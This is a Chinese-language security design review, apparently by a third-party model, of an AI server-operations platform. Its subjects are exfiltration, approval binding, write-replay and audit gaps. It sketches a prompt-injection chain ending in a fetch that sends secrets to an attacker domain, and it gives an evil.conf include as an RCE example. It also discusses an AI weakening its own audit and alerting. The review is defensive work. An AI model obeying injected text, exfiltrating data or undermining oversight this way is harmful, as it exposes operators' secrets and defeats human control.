# 外部评审报告一：GPT Astra（2026-10-20）

评审对象：external-review-brief.md。来源：第三方模型评审（GPT-6 Astra），原文完整存档。

## 总判断

方向成立，但安全模型尚未闭合。真正困难的不是让 AI 调用运维工具，而是让"授权对象、实际执行、现场状态、结果证据"始终一致。当前设计对执行完整性考虑较多，对数据外泄、可用性损害、断线重试、间接提权和授权后的环境变化考虑不足。

- 不存在必须推倒重来的范式缺陷。
- 存在必须先修复的架构矛盾（自指边界、自动审批、自由 shell 与总口径不一致）。
- 当前实现不能按目标架构的安全能力交付（核心执行仍是自由 shell）。
- 50 台服务器不是性能难题，是故障与权限边界难题。

## 架构问题

### 1. 🔴 "只读"不是完整安全边界，数据出口存在缺口
攻击链：指令进日志/网页/Skill → AI 读到密钥/业务数据 → fetch("https://攻击者域名/敏感内容") → 泄露。匿名 GET 无凭据不等于无泄露，请求 URL 本身就是数据载体。search query 脱敏覆盖不了任意业务秘密/编码拆分。fetch 还需防 SSRF（环回/内网/链路本地/云元数据/重定向/DNS 重绑定），仅清洗正文无效。
修正：读服务器权限与外部联网权限拆开；敏感资产默认关闭自由外联；search/fetch 走统一受控出口；明确模型 API 也是出口；"标记不可信文本"不能当防注入机制。

### 2. 🔴 无 shell 只消除 shell 语法，不消除被调用程序的执行能力
kubectl kubeconfig 可含认证执行插件；systemctl/journalctl 分页器；程序读配置/插件间接执行；docker inspect 等暴露秘密；/proc /sys 放行过宽。应审核"确定版本程序在确定参数/身份/环境/配置/目标范围下的效果"。建议第一版优先专用工具（read_service_status、read_recent_logs）。realpath TOCTOU 评为中等不充分：sudoers 约束执行哪个程序，不约束程序打开哪个文件；特权文件读取需安全打开机制。

### 3. 🟠 "AI 全权调查"损害可用性，需调查预算
大范围扫描、海量日志检索、高基数指标查询、故障时并行诊断都是负载。需并发限制、输出/时长限制、超时终止、重试预算、恶化时自动停止、人工一键停止。改为"在授权数据范围和资源预算内自主调查"。

### 4. 🔴 审批哈希绑定请求，没绑定请求的实际含义
同名服务重建、符号链接变化、动作包更新、集群对象删除重建、凭证权限变化 → 批 A 执行的可能是另一个 A。审批需绑定"执行契约"：稳定目标身份（UID/resourceVersion）、动作版本、规范化参数、凭证身份、有效期、执行次数、前置条件。执行端在副作用发生前检查；漂移则拒绝重新审批。哈希非授权签名，执行端需确认批准者、有效期、已消耗。

### 5. 🔴 seq 补传不能解决写操作重放，缺执行状态机
Agent 完成变更 → 回执发出前断网 → 平台重发 → 变更执行两次。需持久化状态机：已接收/已持久化/正在执行/已完成/结果未知。重传用同一任务 ID；重复任务返回已知状态；非幂等操作进入核实或人工处理；冲突写串行化；过期任务不得在重连后执行；旧 Agent/旧连接不得执行过期授权。遥测可丢最旧，执行结果与授权证据不能同策略淘汰。

### 6. 🟠 postcondition 验证有限事实，不能直接证明任务成功
服务正常≠业务正常；200≠流量已切换；语法合法≠语义正确。区分：动作是否完成 / 技术后置条件 / 用户目标。结果至少"通过/失败/未知"+验证范围+原始证据。被攻陷主机可伪造本机验证输出，关键判断需独立观察点。机械验证定位：减少无依据的完成声明，而非证明现场正确。

### 7. 🔴 自指边界内部冲突：业务接口也可能改变裁判权
改告警规则可隐藏异常；周期 trigger 可持续消耗资源；改文档可植入长期注入；重启平台可中断审批/审计外送。业务对象不天然低风险。重新定义：AI 不得自行扩大权限、修改授权策略、削弱审计和监督；其他平台变更按效果分类授权。trigger 带受限身份与固定授权边界；告警禁用属安全敏感变更；平台重启是人工批准的例外；观察身份与维护身份分开。

### 8. 🟠 自动审批与自由 shell 须成为显式产品模式
实际存在三种模式：自主受限调查 / 人工委托策略下自动变更 / 人工批准高权限自由执行。模式须在界面、协议、审计、对外承诺一致。安全性应来自自动变更策略限定的后果范围，而非任务入口。审批界面优先展示目标、影响范围、前后差异和恢复方式。

### 9. 🟠 自定义动作与动作包是可执行供应链
edit_config_file 写 include /tmp/evil.conf 就是 RCE；修改 systemd unit/定时任务=代码执行。"禁 shell 逃逸"不够。动作需声明可修改资源与字段、权限影响、版本支持、前置条件、验证与恢复、是否允许自动审批。动作包需版本固定、完整性验证、变更审查、停用机制；旧审批不得自动采用新动作实现。v1 不宜默认开放自定义动作自动审批。

### 10. 🟠 审计方案与 SQLite 不匹配
SQLite 无 DB 角色权限模型，不能表述为已具备数据库级防修改。PG 下角色不能拥有表/管理员能力；"不能修改历史"≠"不能插入伪造事件"；同一高权限服务持有所有凭据仍是共同失效点；异机存证需明确延迟窗口与失败策略。区分：常规审计记录 / 执行身份防篡改 / 平台被攻陷后仍可追查——不是同一能力。完整请求+原始输出是敏感数据集中库，需独立访问/脱敏/保留策略。

### 11. 🟠 Agent 信任引导、身份生命周期与 SSH 执行边界不完整
一次性 token 只解决注册一部分。需明确：首次连接验证主服务身份；token 短期单次绑定资产；长期身份、轮换吊销、克隆磁盘重复身份、旧 Agent 失权、SSH 主机密钥变化拒绝。很多 SSH 执行接口传命令字符串非 argv，远端无受控助手时本地传数组不保证无 shell。三通道复用同一执行核心，SSH 仅传输。

### 12. 🟡 Agent 自保可能与业务争抢资源；宕机结论勿过度确定
保护 Agent 可能让业务进程更早被杀；诊断子进程继承高保护风险更大。建议轻量心跳进程与诊断工作进程分开：前者优先保护，后者严格限额。"失联前指标正常"只是候选解释。kdump 需预留内存磁盘实测，保持可选。

### 13. 🟡 模型记录与档位门槛不能解决供应商静默路由
供应商内部替换后端时平台无法独立证明。可记录已知模型/供应商/路由信息、约束允许配置；不能仅凭模型字符串承诺。强模型是质量因素不是安全边界。

## 落地难度

### 容易（严控范围）
50 台规模；注册/心跳/最后在线；对话与模型适配；少量结构化查询；单 Provider 搜索；Skill 导入展示；基础审计告警。SQLite 对此规模未必瓶颈。免费搜索源无 SLA，允许搜索失败降级。

### 中高难度
发行版/权限/CLI 版本兼容；安全文件读取；三通道一致；spool 配额与不误淘汰；审批体验；安装升级卸载与凭证轮换；跨版本维护后置验证。

### 真正的深坑（🔴）
1. 写操作状态机：超时/重试/重复/部分成功/重启/失联。
2. 动作语义边界：参数合法不代表后果有限。
3. 授权到执行一致性：版本/目标身份/现场漂移。
4. 安全验证证据：拒绝路径与故障路径正确性证明。
5. 产品范围控制：全 Linux+SSH+Agent+云+K8s+带外+合规+自定义动作同时推进会耗尽单人团队。AI 快速生成代码不会自动建立跨模块不变量。

## 最稳落地顺序

1. 🔴 第一阶段：冻结边界，清除设计矛盾。短而唯一的现行契约（OS/部署方式、资产身份数据范围、调查资源预算、授权/完成/未知定义、AI 可改的平台对象、明确不提供的能力）。统一自由 shell/auto-approve/自纳入例外。生产配置关闭模型自由 shell 与自动变更。
2. 🟠 第二阶段：可信只读版本。一种 Linux+一个 Agent+少量专用只读工具；安全注册、执行端授权、低权限身份、输出与资源预算、路径与敏感信息控制、审计心跳断线恢复。验收含恶意参数/恶意日志/插件配置/超大输出/磁盘满/断网/Agent 重启。
3. 🔴 第三阶段：只做一两个完整的人工审批动作（如重启指定服务）。端到端：不可变执行契约、前置条件、审批有效期与一次性、持久化状态机、冲突控制、执行与结果分别存证、后置验证、未知即停、有条件恢复。先证明一个动作在故障中正确，再加十个。
4. 🟠 第四阶段：真实场景扩展（少量用户代表性机器→50 台），看拒绝率/审批可懂性/未知率/动作维护成本。再扩 SSH、日志指标、搜索、动作包。自动审批只对充分测试、影响有界的动作开放。
5. 🔵 第五阶段：企业能力与领域收费（PG、细分权限、外部审计、带外、合规包）放基本执行能力稳定后。等保包围绕检查依据/证据采集/适用条件/整改验证交付。

## 最大风险与最终判断

🔴 最大风险：为可用性不断开例外，最终只剩聊天界面的高权限远程执行器（只读不够→开 shell→审批烦→自动批→动作不灵活→自定义脚本→边界退化为提示词+点确认）。不可退让约束：不因模型更强放宽执行边界；不把无法分类动作归为只读；不为兼容场景自动升级权限；不把结果未知当失败重试；不把人工批准包装成平台已验证安全。

最终判断：可做且值得做，但应把目标从"通用 AI 运维平台全栈"收敛为"有限运维能力的可信授权与执行系统"。窄范围只读产品是可控工程；少量生产变更是高难度工程；跨环境通用动作平台/企业治理/合规闭环是持续维护的产品线。现在最该投入的不是加工具和订阅包，而是把一次变更在断网/重启/漂移/重复消息下做对——那是能否进生产的分水岭。
